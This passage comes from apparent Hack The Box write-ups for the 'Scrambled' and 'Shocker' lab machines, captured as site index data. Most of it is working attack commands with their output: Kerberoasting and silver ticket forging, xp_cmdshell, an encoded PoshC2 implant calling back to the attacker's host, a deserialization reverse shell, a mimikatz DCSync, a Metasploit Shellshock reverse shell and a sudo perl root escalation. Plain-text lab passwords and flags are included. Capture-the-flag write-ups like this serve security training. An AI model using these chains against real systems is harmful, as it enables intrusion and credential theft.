TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: | SCRAMBLECORP_ORDERS_V1.0.3 ; | FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions: | SCRAMBLECORP_ORDERS_V1.0.3 ; | _ ERROR_UNKNOWN_COMMAND ; 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port4411-TCP:V = 7 .91%I = 7 %D = 7 /15%Time = 62D1288A%P = x86_64-pc-linux-gnu%r ( NU SF:LL,1D, \"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\" ) %r ( GenericLines,1D, \"SCRAMBLEC SF:ORP_ORDERS_V1\\.0\\.3;\\r\\n\" ) %r ( GetRequest,35, \"SCRAMBLECORP_ORDERS_V1\\.0\\. SF:3;\\r\\nERROR_UNKNOWN_COMMAND;\\r\\n\" ) %r ( HTTPOptions,35, \"SCRAMBLECORP_ORDER SF:S_V1\\.0\\.3;\\r\\nERROR_UNKNOWN_COMMAND;\\r\\n\" ) %r ( RTSPRequest,35, \"SCRAMBLEC SF:ORP_ORDERS_V1\\.0\\.3;\\r\\nERROR_UNKNOWN_COMMAND;\\r\\n\" ) %r ( RPCCheck,1D, \"SCR SF:AMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\" ) %r ( DNSVersionBindReqTCP,1D, \"SCRAMBLECOR SF:P_ORDERS_V1\\.0\\.3;\\r\\n\" ) %r ( DNSStatusRequestTCP,1D, \"SCRAMBLECORP_ORDERS_ SF:V1\\.0\\.3;\\r\\n\" ) %r ( Help,35, \"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\nERROR_UNKNO SF:WN_COMMAND;\\r\\n\" ) %r ( SSLSessionReq,1D, \"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n SF:\" ) %r ( TerminalServerCookie,1D, \"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\" ) %r ( TLS SF:SessionReq,1D, \"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\" ) %r ( Kerberos,1D, \"SCRAM SF:BLECORP_ORDERS_V1\\.0\\.3;\\r\\n\" ) %r ( SMBProgNeg,1D, \"SCRAMBLECORP_ORDERS_V1\\ SF:.0\\.3;\\r\\n\" ) %r ( X11Probe,1D, \"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\" ) %r ( FourO SF:hFourRequest,35, \"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\nERROR_UNKNOWN_COMMAND SF:;\\r\\n\" ) %r ( LPDString,35, \"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\nERROR_UNKNOWN_ SF:COMMAND;\\r\\n\" ) %r ( LDAPSearchReq,1D, \"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\" ) % SF:r ( LDAPBindReq,1D, \"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\" ) %r ( SIPOptions,35, \" SF:SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\nERROR_UNKNOWN_COMMAND;\\r\\n\" ) %r ( LANDesk SF:-RC,1D, \"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\" ) %r ( TerminalServer,1D, \"SCRAMB SF:LECORP_ORDERS_V1\\.0\\.3;\\r\\n\" ) %r ( NCP,1D, \"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r SF:\\n\" ) %r ( NotesRPC,1D, \"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\" ) %r ( JavaRMI,1D, \"S SF:CRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\" ) %r ( WMSRequest,1D, \"SCRAMBLECORP_ORDERS SF:_V1\\.0\\.3;\\r\\n\" ) %r ( oracle-tns,1D, \"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\" ) %r SF: ( ms-sql-s,1D, \"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\" ) %r ( afp,1D, \"SCRAMBLECOR SF:P_ORDERS_V1\\.0\\.3;\\r\\n\" ) %r ( giop,1D, \"SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\" ) ; Also, we can run nc . nc 10 .10.11.168 4411 SCRAMBLECORP_ORDERS_V1.0.3 ; test ERROR_UNKNOWN_COMMAND ; Going back to web pages, the web page /passwords.html disclose useful information. Which is: we will reset your password to be the same as the username. So now we know that if we attempt to reset a user password, the new password will be same as the username. From this information, let's try to hunt for users.","title":"Web Enumeration"},{"location":"Writeups/machines/scrambled/writeup/#user-enumeration","text":"Because it is Domain Controller we can enumerate valid Domain Users using Pre-Authentication . Note The Kerberos authentication protocol works with tickets in order to grant access. A ST (Service Ticket) can be obtained by presenting a TGT (Ticket Granting Ticket). That prior TGT can only be obtained by validating a first step named \"pre-authentication\" (except if that requirement is explicitly removed for some accounts, making them vulnerable to ASREProast. For further reading refer to this resource . To enumerate the valid Domain Users I'll use Impacket's GetNPUsers and shorter wordlist that can be found here . We can also use the wordlist /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt but will take too much of time. To enumerate the valid Domain Users run the following command: GetNPUsers.py scrm.local/ -no-pass -dc-ip 10 .10.11.168 -usersfile A-ZSurnames.txt Alternatively, we can use Kerbrute which is faster because it is based in Golang. Kerbrute can be downloaded from here ./kerbrute userenum -d scrm.local A-ZSurnames.txt --dc dc1.scrm.local __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\ / ,< / __/ / / /_/ / / / /_/ / /_/ __/ /_/ | _ | \\_ __/_/ /_.___/_/ \\_ _,_/ \\_ _/ \\_ __/ Version: v1.0.3 ( 9dad6e1 ) - 07 /15/22 - Ronnie Flathers @ropnop 2022 /07/15 05 :36:26 > Using KDC ( s ) : 2022 /07/15 05 :36:26 > dc1.scrm.local:88 2022 /07/15 05 :36:27 > [ + ] VALID USERNAME: ASMITH@scrm.local 2022 /07/15 05 :38:25 > [ + ] VALID USERNAME: JHALL@scrm.local 2022 /07/15 05 :38:39 > [ + ] VALID USERNAME: KSIMPSON@scrm.local 2022 /07/15 05 :38:47 > [ + ] VALID USERNAME: KHICKS@scrm.local 2022 /07/15 05 :40:25 > [ + ] VALID USERNAME: SJENKINS@scrm.local","title":"User Enumeration"},{"location":"Writeups/machines/scrambled/writeup/#password-spray","text":"After finding valid Domain Users, let's conduct password spray attacks using the username as password for each user. Here we can use smartbrute tool. Bug I had an issue during while solving the machine. NTLM authentication is disabled we can use kerberos authentication instead. The issue is when using tools such as crackmapexec or impacket sometime it will fail and does not give us any information. To solve this issue use -k flag to make use of kerberos authentication.","title":"Password Spray"},{"location":"Writeups/machines/scrambled/writeup/#enumerate-spns","text":"After obtaining valid creds, we might be able to enumerate SPNs account using Impacket's GetUserSPNs . As I said before the NTLM authentication will not work we should use the flag -k . Hence, I found an issue in GetUserSPNs to solve this issue refer to this link . GetUserSPNs.py scrm.local/ksimpson: 'ksimpson' -dc-ip dc1.scrm.local -request -k Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation [ - ] CCache file is not found. Skipping... [ - ] CCache file is not found. Skipping... ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation ---------------------------- ------ -------- -------------------------- -------------------------- ---------- MSSQLSvc/dc1.scrm.local:1433 sqlsvc 2021 -11-03 12 :32:02.351452 2022 -07-15 04 :08:04.045229 MSSQLSvc/dc1.scrm.local sqlsvc 2021 -11-03 12 :32:02.351452 2022 -07-15 04 :08:04.045229 [ - ] CCache file is not found. Skipping... $krb5tgs$23$* sqlsvc $SCRM .LOCAL $scrm .local/sqlsvc* $031 a9fba52ac8c46413a559f05f2fe1f $befe1c8b7246da2c80a057ffeee4503106a0de5bca8f0cc81469e54c69e3be1ee7cbc3567e9990fabd32e653f1d3a4f9787d579b10c30c9913210a5452ed611721c44022973ba13731d075903a34d5ddca25a73067cd2013922cd89f6488c3af107775808b9b98d9f4ae07cf882a566e3c75653fcef9fc1c42b70358da3042992d7e94729a81596c6ef6d9e6ef51805379e7d639be2557117a9d12a84fb0aacb94733a41d26b3ffccc1d47ec4633fcec65557e3aa344a18d196b3cf9309af5f2a9ac1003beb68ff5d8d92da347b482631d3e894bedbbbca179a04ebf08c57d59c0a0a38cea9614d2ac4c23d296a25daf12532baa82239182d6f17fbccf6339576ceb67d14dde62ca081535e7bd50724628237043452619f06384886b32f12081911e929a05e3ec466e8c713186e00d3dc55e7f6f7342c05e314b633f4bd93b0f7fc19a05e23bd8edebfcae94d97379007439cddd73804d26cf525f13fe6f50c0e7c70cd3ebdf40ac9c2ed3a993aee2240bef32dd7fe6dcf0d8993c404eb6b658ba53ab914de5555ed978af147c12e1d3f53ae97185a041a3d7fea1bf89bf19e997ed0937fc1e13ab662734b0ce84b003735ba667bc40b6683c86357645a5a3db70711011776f6c4abf207bfc15630cb6733203fdd7af275791869c8d5388b1805e1eb64820da7cdac9d7333a49fc55b48b8bced8ad2d0b808b193f03279b40204a88e212c6b67c7027384b41150a8d794672aa6951c604f2d2f0c205365a20c7e16091ab51cdc80ab24373e4a76a43bef9094eae1560f0c6a167fc7a8b221cd317781a62c4d92b4f5e64c0de5ea8cefaf2db02d26575006750ceea095ec67af0630df7d2415fb77bdf782b2c5c37bbb80237afb031e5f234ed8f6b855c69fdfa0311c05cdd45d8c55817e17183c082f9094f6b36e908f1e5ab5d1dea8b6b182b0c1261bacaa4750042d0ee9cf6612b51013e0b7cfa05fa2cf8876a91698e652e36d374299ff22c98521c73bc46b9b4c8368a70cb6c33934fa0bcbc75bbd145dde1201f91f8465b8605bdbab21364b8dd60b1c00c63f7a3c09a6b5d2bbce1874a34289a47b627e81f220a506fcee5da9173b4d0b44cbc6bfea99e0704345a617ad48ce60b8a4578261d069995888de9a587220c5ee60757c5e4a7b1551349299dab8f084c21a8d85ed896f886c8087ece4e0ba3ceeef0a81527d48f6410c90147dd2b424cfb9283814210f697f9a71e08b5e2a942c814b8007f8b2e893527f0be18313cc11515d600c7945b66a6db9d90189d03d0560cb6f0bd146b151e88fd6dfedd6f858f39be7a00b7b5b9369a9f5bb31b6189a76e4fa3b0ee891409776f171f4382c95a3d9ed6ef815e274015daaae6045a674ef481e0aef48b805ab3ef5c1c42bcea8562c28cdbe466dcdb4cc379ae998a4c01378c42a5651f Now we retrieve the TGS of the SPN account sqlsvc , we can use hashcat to crack the TGS ticket. hashcat -a 0 -m 13100 sqlsvc-spn /usr/share/wordlists/rockyou.txt --force $krb5tgs$23$* sqlsvc $SCRM .LOCAL $scrm .local/sqlsvc* $031 a9fba52ac8c46413a559f05f2fe1f $befe1c8b7246da2c80a057ffeee4503106a0de5bca8f0cc81469e54c69e3be1ee7cbc3567e9990fabd32e653f1d3a4f9787d579b10c30c9913210a5452ed611721c44022973ba13731d075903a34d5ddca25a73067cd2013922cd89f6488c3af107775808b9b98d9f4ae07cf882a566e3c75653fcef9fc1c42b70358da3042992d7e94729a81596c6ef6d9e6ef51805379e7d639be2557117a9d12a84fb0aacb94733a41d26b3ffccc1d47ec4633fcec65557e3aa344a18d196b3cf9309af5f2a9ac1003beb68ff5d8d92da347b482631d3e894bedbbbca179a04ebf08c57d59c0a0a38cea9614d2ac4c23d296a25daf12532baa82239182d6f17fbccf6339576ceb67d14dde62ca081535e7bd50724628237043452619f06384886b32f12081911e929a05e3ec466e8c713186e00d3dc55e7f6f7342c05e314b633f4bd93b0f7fc19a05e23bd8edebfcae94d97379007439cddd73804d26cf525f13fe6f50c0e7c70cd3ebdf40ac9c2ed3a993aee2240bef32dd7fe6dcf0d8993c404eb6b658ba53ab914de5555ed978af147c12e1d3f53ae97185a041a3d7fea1bf89bf19e997ed0937fc1e13ab662734b0ce84b003735ba667bc40b6683c86357645a5a3db70711011776f6c4abf207bfc15630cb6733203fdd7af275791869c8d5388b1805e1eb64820da7cdac9d7333a49fc55b48b8bced8ad2d0b808b193f03279b40204a88e212c6b67c7027384b41150a8d794672aa6951c604f2d2f0c205365a20c7e16091ab51cdc80ab24373e4a76a43bef9094eae1560f0c6a167fc7a8b221cd317781a62c4d92b4f5e64c0de5ea8cefaf2db02d26575006750ceea095ec67af0630df7d2415fb77bdf782b2c5c37bbb80237afb031e5f234ed8f6b855c69fdfa0311c05cdd45d8c55817e17183c082f9094f6b36e908f1e5ab5d1dea8b6b182b0c1261bacaa4750042d0ee9cf6612b51013e0b7cfa05fa2cf8876a91698e652e36d374299ff22c98521c73bc46b9b4c8368a70cb6c33934fa0bcbc75bbd145dde1201f91f8465b8605bdbab21364b8dd60b1c00c63f7a3c09a6b5d2bbce1874a34289a47b627e81f220a506fcee5da9173b4d0b44cbc6bfea99e0704345a617ad48ce60b8a4578261d069995888de9a587220c5ee60757c5e4a7b1551349299dab8f084c21a8d85ed896f886c8087ece4e0ba3ceeef0a81527d48f6410c90147dd2b424cfb9283814210f697f9a71e08b5e2a942c814b8007f8b2e893527f0be18313cc11515d600c7945b66a6db9d90189d03d0560cb6f0bd146b151e88fd6dfedd6f858f39be7a00b7b5b9369a9f5bb31b6189a76e4fa3b0ee891409776f171f4382c95a3d9ed6ef815e274015daaae6045a674ef481e0aef48b805ab3ef5c1c42bcea8562c28cdbe466dcdb4cc379ae998a4c01378c42a5651f :Pegasus60 We cracked sqlsvc 's password which is: Pegasus60 . As seen previously the service account sqlsvc is allowed to access MSSQL service.","title":"Enumerate SPNs"},{"location":"Writeups/machines/scrambled/writeup/#enumerate-shares","text":"Because of NTLM authentication is disabled we will use kerberos as authetication protocol. To do this, we can export user's ticket using Impacket's GetTGT : getTGT.py scrm.local/ksimpson: 'ksimpson' Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation [ * ] Saving ticket in ksimpson.ccache The Domain User ksimpson 's ticket is exported in the file ksimpsone.ccache . Then, we have to save the exported ticket in the variable KRB5CCNAME in order to use the flag -k . export KRB5CCNAME = 'ksimpson.ccache' Now we can access shared folders for the Domain User ksimpson : impacket-smbclient scrm.local/ksimpson@dc1.scrm.local -k -no-pass # shares ADMIN$ C$ HR IPC$ IT NETLOGON Public Sales SYSVOL # use public # ls drw-rw-rw- 0 Thu Nov 4 18 :23:19 2021 . drw-rw-rw- 0 Thu Nov 4 18 :23:19 2021 .. -rw-rw-rw- 630106 Fri Nov 5 13 :45:07 2021 Network Security Changes.pdf # get Network Security Changes.pdf # exit From Public shared folder we identify a document that contains: After reading the letter we verified that the NTLM authentication is disabled in the machine.","title":"Enumerate Shares"},{"location":"Writeups/machines/scrambled/writeup/#access-mssql","text":"What we can do now is access MSSQL service using sqlsvc service account via kerberos authentication. To do that, first we have to request for Ticket-Granting Service (TGS) ticket that will allows us to access the MSSQL service, or let's say we conduct silver ticket attack. Before we do that, we have to know SID of the domain. We can run SecretDump with the flag -debug : secretsdump scrm.local/ksimpson@dc1.scrm.local -k -no-pass -debug Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation [ + ] Impacket Library Installation Path: /home/kali/.local/lib/python3.9/site-packages/impacket [ + ] Using Kerberos Cache: ksimpson.ccache ... [ + ] Calling DRSCrackNames for S-1-5-21-2743207045-1827831105-2542523200-500 ... From the SecretDump output, the SID for the Domain SCRM.LOCAL is: S-1-5-21-2743207045-1827831105-2542523200 . I removed 500 because it is represents the Domain Administrator. Furthermore, to conduct the attack the NTLM hash of the service account sqlsvc is required. We can convert the password of the service account sqlsvc to NTLM hash using Python. import hashlib , binascii hash = hashlib . new ( 'md4' , \"Pegasus60\" . encode ( 'utf-16le' )) . digest () print ( binascii . hexlify ( hash )) sqlsvc NTLM hash is: b999a16500b87d17ec7f2e2a68778f05 Now we will use Impacket's ticket to generate TGS that will allow us to access MSSQL service: ticketer.py -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -nthash b999a16500b87d17ec7f2e2a68778f05 -domain scrm.local -spn MSSQLSvc/dc1.scrm.local administrator Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation [ * ] Creating basic skeleton ticket and PAC Infos [ * ] Customizing ticket for scrm.local/administrator [ * ] PAC_LOGON_INFO [ * ] PAC_CLIENT_INFO_TYPE [ * ] EncTicketPart [ * ] EncTGSRepPart [ * ] Signing/Encrypting final ticket [ * ] PAC_SERVER_CHECKSUM [ * ] PAC_PRIVSVR_CHECKSUM [ * ] EncTicketPart [ * ] EncTGSRepPart [ * ] Saving ticket in administrator.ccache The TGS ticket saved in the file administrator.ccache we have to save it in the variable KRB5CCACHENAME : export KRB5CCNAME = 'administrator.ccache' Now we can access MSSQL: impacket-mssqlclient dc1.scrm.local -dc-ip 10 .10.11.168 -k -no-pass Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation [ * ] Encryption required, switching to TLS [ * ] ENVCHANGE ( DATABASE ) : Old Value: master, New Value: master [ * ] ENVCHANGE ( LANGUAGE ) : Old Value: , New Value: us_english [ * ] ENVCHANGE ( PACKETSIZE ) : Old Value: 4096 , New Value: 16192 [ * ] INFO ( DC1 ) : Line 1 : Changed database context to 'master' . [ * ] INFO ( DC1 ) : Line 1 : Changed language setting to us_english. [ * ] ACK: Result: 1 - Microsoft SQL Server ( 150 7208 ) [ ! ] Press help for extra shell commands SQL> After obtaining access into MSSQL, the first thing we can do is enable xp_cmdshell to allow us to execute commands: SQL> enable_xp_cmdshell [ * ] INFO ( DC1 ) : Line 185 : Configuration option 'show advanced options' changed from 1 to 1 . Run the RECONFIGURE statement to install. [ * ] INFO ( DC1 ) : Line 185 : Configuration option 'xp_cmdshell' changed from 1 to 1 . Run the RECONFIGURE statement to install. SQL> disable_xp_cmdshell enable_xp_cmdshell exit help lcd shell xp_cmdshell SQL> xp_cmdshell whoami output -------------------------------------------------------------------------------- scrm \\s qlsvc NULL SQL>","title":"Access MSSQL"},{"location":"Writeups/machines/scrambled/writeup/#configuring-poshc2","text":"First of all, create a new project and name it as you want. I'll name it as htb . posh-project htb Then, configure the newly created profile. posh-config Go to the 14th line and point the value of PayloadCommsHost to your VPN IP. PayloadCommsHost: \"https://<your_vpn_ip>\" Start the PoshC2 server by typing sudo posh-server In another windows connect the team server posh -u user1 Now we have two windows. At the left is the team server and at the right is the user terminal. To make use of the C2 we should drop our beacon or payload into the box usually we have command execution in the box. There is a lots of payloads types that PoshC2 generates such as Powershell reverse shell , Dlls , EXEs , Macros , DotNet2JS or even HTAs which can be used in phishing campaigns.","title":"Configuring PoshC2"},{"location":"Writeups/machines/scrambled/writeup/#obtaining-access","text":"As I said PoshC2 have generated several payloads types, as demonstration we can use powershell oneliner. Run this command in MSSQL. SQL> xp_cmdshell powershell -exec bypass -Noninteractive -windowstyle hidden -e WwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgB....FMA After running this command in MSSQL we will receive a new implant in our C2. Team server window: Operation window: If we execute the command help we can do many useful operations such as: Active Directory enumeration, lateral movement, privilege escalation and many. As an example, let's enumerate domain objects ACLs: SCRM \\s qlsvc @ DC1 ( PID:5948 ) PS 1 > invoke-aclscanner # teamserver: Task 00003 ( user1 ) returned against implant 1 on host SCRM \\s qlsvc @ DC1 ( 2022 -07-15 07 :56:23 ) ObjectDN : DC = RootDNSServers,CN = MicrosoftDNS,CN = System,DC = scrm,DC = local AceQualifier : AccessAllowed ActiveDirectoryRights : CreateChild, DeleteChild, ListChildren, ReadProperty, DeleteTree, ExtendedRight, Delete, GenericWrite, WriteDacl, WriteOwner ObjectAceType : None AceFlags : ContainerInherit, Inherited AceType : AccessAllowed InheritanceFlags : ContainerInherit SecurityIdentifier : S-1-5-21-2743207045-1827831105-2542523200-1101 IdentityReferenceName : DnsAdmins IdentityReferenceDomain : scrm.local IdentityReferenceDN : CN = DnsAdmins,CN = Users,DC = scrm,DC = local IdentityReferenceClass : group ObjectDN : DC = @,DC = RootDNSServers,CN = MicrosoftDNS,CN = System,DC = scrm,DC = local AceQualifier : AccessAllowed ActiveDirectoryRights : CreateChild, DeleteChild, ListChildren, ReadProperty, DeleteTree, ExtendedRight, Delete, GenericWrite, WriteDacl, WriteOwner ObjectAceType : None AceFlags : ContainerInherit, Inherited AceType : AccessAllowed InheritanceFlags : ContainerInherit SecurityIdentifier : S-1-5-21-2743207045-1827831105-2542523200-1101 IdentityReferenceName : DnsAdmins IdentityReferenceDomain : scrm.local IdentityReferenceDN : CN = DnsAdmins,CN = Users,DC = scrm,DC = local IdentityReferenceClass : group","title":"Obtaining Access"},{"location":"Writeups/machines/scrambled/writeup/#pivot-to-miscsql","text":"Going back to MSSQL, enumerate the databases: SQL > SELECT name FROM master . dbo . sysdatabases ; name -------------------------------------------------------------------------------------------------------------------------------- master tempdb model msdb ScrambleHR Enumerating the database ScrambleHR tables disclose for us the table UserImport SELECT * FROM SYSOBJECTS The table UserImport contains a Domain User creds: SQL > select * from UserImport LdapUser LdapPwd LdapDomain RefreshInterval IncludeGroups -------------------------------------------------- -------------------------------------------------- -------------------------------------------------- --------------- ------------- MiscSvc ScrambledEggs9900 scrm . local 90 0 SQL > The creds are MiscSvc:ScrambledEggs9900 we can test the validity of the obtained creds using PoshC2 PS 1 > test-adcredential -domain scrm.local -user miscsvc -password ScrambledEggs9900 Team Server: Task 00023 ( user1 ) returned against implant 1 on host SCRM \\s qlsvc @ DC1 ( 2022 -07-15 08 :23:53 ) Username Password IsValid -------- -------- ------- miscsvc ScrambledEggs9900 True To pivot to the Domain User MiscSVC run the following command in operations window: $password = ConvertTo-SecureString \"ScrambledEggs9900\" -AsPlainText -Force $creds = new-object system.management.automation.pscredential ( \"scrm.local\\miscsvc\" , $password ) invoke-command -computer . -scriptblock { <PoshC2 powershell oneliner payload> } -credential $creds After running the commands we will receive new implant as the domain user miscsvc Now we obtain access as miscsvc","title":"Pivot to MiscSQL"},{"location":"Writeups/machines/scrambled/writeup/#privilege-escalation","text":"","title":"Privilege Escalation"},{"location":"Writeups/machines/scrambled/writeup/#enumerating-sales-app","text":"By enumerating the host, we will identifies executable application \" Sales Order App \" which is locate at: c:\\shares\\it\\apps\\Sales Order Client . We can download both files using PoshC2 by issuing the following command: download-file \"c:\\shares\\it\\apps\\Sales Order Client\\ScrambleClient.exe\" download-file \"c:\\shares\\it\\apps\\Sales Order Client\\ScrambleLib.dll\" The download location is at: /var/poshc2/htb/downloads . Here I used dnSpy to decompile the .NET applications. I focused in the .dll. After enumerating the source code of ScrambleLib.dll , found a function called UploadOrder that takes the input and deserialize it. From the first code, we can identify that we can pass the string UPLOAD_ORDER followed by simi-column followed by serialize object in base64 format. After passing this input the server will deserialize it and execute it. public static string GetCodeFromMessageType ( ScrambleNetRequest . RequestType MsgType ) { if ( ScrambleNetRequest . _MessageTypeToCode == null ) { ScrambleNetRequest . _MessageTypeToCode = new Dictionary < ScrambleNetRequest . RequestType , string > (); ScrambleNetRequest . _MessageTypeToCode . Add ( ScrambleNetRequest . RequestType . CloseConnection , \"QUIT\" ); ScrambleNetRequest . _MessageTypeToCode . Add ( ScrambleNetRequest . RequestType . ListOrders , \"LIST_ORDERS\" ); ScrambleNetRequest . _MessageTypeToCode . Add ( ScrambleNetRequest . RequestType . AuthenticationRequest , \"LOGON\" ); ScrambleNetRequest . _MessageTypeToCode . Add ( ScrambleNetRequest . RequestType . UploadOrder , \"UPLOAD_ORDER\" ); } return ScrambleNetRequest . _MessageTypeToCode [ MsgType ]; public void UploadOrder ( SalesOrder NewOrder ) { try { Log . Write ( \"Uploading new order with reference \" + NewOrder . ReferenceNumber ); string text = NewOrder . SerializeToBase64 (); Log . Write ( \"Order serialized to base64: \" + text ); ScrambleNetResponse scrambleNetResponse = this . SendRequestAndGetResponse ( new ScrambleNetRequest ( ScrambleNetRequest . RequestType . UploadOrder , text )); ScrambleNetResponse . ResponseType type = scrambleNetResponse . Type ; if ( type != ScrambleNetResponse . ResponseType . Success ) { throw new ApplicationException ( scrambleNetResponse . GetErrorDescription ()); } Log . Write ( \"Upload successful\" ); } catch ( Exception ex ) { Log . Write ( \"Error: \" + ex . Message ); throw ex ; } } As verification we can pass the string UPLOAD_ORDER followed by anything: htb/downloads \u2192 nc 10 .10.11.168 4411 SCRAMBLECORP_ORDERS_V1.0.3 ; UPLOAD_ORDER ERROR_GENERAL ; Error deserializing sales order: Attempting to deserialize an empty stream. UPLOAD_ORDER ; 1 ERROR_GENERAL ; Error deserializing sales order: Invalid length for a Base-64 char array or string. As we can see the server takes the string after the simi-column and attempt to deserialize it. We can abuse this to obtain command executing by passing serialized reverse shell command. Now connect to Sales app server using netcat and enter the deserialized string as below: nc 10 .10.11.168 4411 SCRAMBLECORP_ORDERS_V1.0.3 ; UPLOAD_ORDER ; AAEAAAD/////... After short time we will receive a new implant as SYSTEM . Finally, we can conduct DCSync towards the Domain Controller from PoshC2 using the following command: invoke-mimikatz -command '\"privilege::debug\" \"lsadump::dcsync /domain:scrm.local /all\"'","title":"Enumerating Sales App"},{"location":"Writeups/machines/scrambled/writeup/#lesson-learned","text":"Using PoshC2 as Command & Control for PT Operations. User enumeration via pre-authetication. Dealing with kerberos authentication to lateral movements and pivoting. .NET source code review. Deserialization attack.","title":"Lesson Learned"},{"location":"Writeups/machines/shoker/writeup/","text":"Overview \u00b6 Machine Info \u00b6 Walkthrough \u00b6 Recon \u00b6 nmap \u00b6 PORT STATE SERVICE REASON VERSION 80 /tcp open http syn-ack Apache httpd 2 .4.18 (( Ubuntu )) | http-methods: | _ Supported Methods: POST OPTIONS GET HEAD | _http-server-header: Apache/2.4.18 ( Ubuntu ) | _http-title: Site doesn ' t have a title ( text/html ) . 2222 /tcp open ssh syn-ack OpenSSH 7 .2p2 Ubuntu 4ubuntu2.2 ( Ubuntu Linux ; protocol 2 .0 ) | ssh-hostkey: | 2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 ( RSA ) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD8ArTOHWzqhwcyAZWc2CmxfLmVVTwfLZf0zhCBREGCpS2WC3NhAKQ2zefCHCU8XTC8hY9ta5ocU+p7S52OGHlaG7HuA5Xlnihl1INNsMX7gpNcfQEYnyby+hjHWPLo4++fAyO/lB8NammyA13MzvJy8pxvB9gmCJhVPaFzG5yX6Ly8OIsvVDk+qVa5eLCIua1E7WGACUlmkEGljDvzOaBdogMQZ8TGBTqNZbShnFH1WsUxBtJNRtYfeeGjztKTQqqj4WD5atU8dqV/iwmTylpE7wdHZ+38ckuYL9dmUPLh4Li2ZgdY6XniVOBGthY5a2uJ2OFp2xe1WS9KvbYjJ/tH | 256 22 :8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 ( ECDSA ) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiFJd2F35NPKIQxKMHrgPzVzoNHOJtTtM+zlwVfxzvcXPFFuQrOL7X6Mi9YQF9QRVJpwtmV9KAtWltmk3qm4oc = | 256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 ( ED25519 ) | _ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC/RjKhT/2YPlCgFQLx+gOXhC6W3A3raTzjlXQMT8Msk Service Info: OS: Linux ; CPE: cpe:/o:linux:linux_kernel Web Enumeration \u00b6 \u039e OldBoxes/shocker \u2192 dirb http://10.10.10.56 ----------------- DIRB v2.22 By The Dark Raver ----------------- START_TIME: Fri Jul 2 00 :44:44 2021 URL_BASE: http://10.10.10.56/ WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt ----------------- GENERATED WORDS: 4612 ---- Scanning URL: http://10.10.10.56/ ---- + http://10.10.10.56/cgi-bin/ ( CODE:403 | SIZE:294 ) + http://10.10.10.56/index.html ( CODE:200 | SIZE:137 ) Exploitation \u00b6 PHP CGI ShellShock RCE \u00b6 \u039e HTB/Boxes \u2192 msfconsole msf6 > use exploit/multi/http/apache_mod_cgi_bash_env_exec msf6 exploit ( multi/http/apache_mod_cgi_bash_env_exec ) > set rhosts 10 .10.10.56 rhosts = > 10 .10.10.56 msf6 exploit ( multi/http/apache_mod_cgi_bash_env_exec ) > set lhost tun0 lhost = > tun0 msf6 exploit ( multi/http/apache_mod_cgi_bash_env_exec ) > set targeturi http://10.10.10.56/cgi-bin/user.sh targeturi = > http://10.10.10.56/cgi-bin/user.sh msf6 exploit ( multi/http/apache_mod_cgi_bash_env_exec ) > exploit [ * ] Started reverse TCP handler on 10 .10.14.27:4444 [ * ] Command Stager progress - 100 .46% done ( 1097 /1092 bytes ) [ * ] Sending stage ( 36 bytes ) to 10 .10.10.56 [ * ] Command shell session 1 opened ( 10 .10.14.27:4444 -> 10 .10.10.56:54578 ) at 2021 -07-02 01 :07:49 -0400 cd /home ls shelly cd shelly cat user.txt 3b57ccf9e22e42963b66361538597f4b Privilege Escalation \u00b6 Enumerate SUID \u00b6 sudo -l Matching Defaults entries for shelly on Shocker: env_reset, mail_badpass, secure_path = /usr/local/sbin \\: /usr/local/bin \\: /usr/sbin \\: /usr/bin \\: /sbin \\: /bin \\: /snap/bin User shelly may run the following commands on Shocker: ( root ) NOPASSWD: /usr/bin/perl Obtaining Root Privileges \u00b6 sudo /usr/bin/perl -e 'exec \"/bin/sh\";' id uid = 0 ( root ) gid = 0 ( root ) groups = 0 ( root ) cd /root cat root.txt ae449b79adfb43de491e9bf4bc2a9c19","title":"Shocker Write-up"},{"location":"Writeups/machines/shoker/writeup/#overview","text":"","title":"Overview"},{"location":"Writeups/machines/shoker/writeup/#machine-info","text":"","title":"Machine 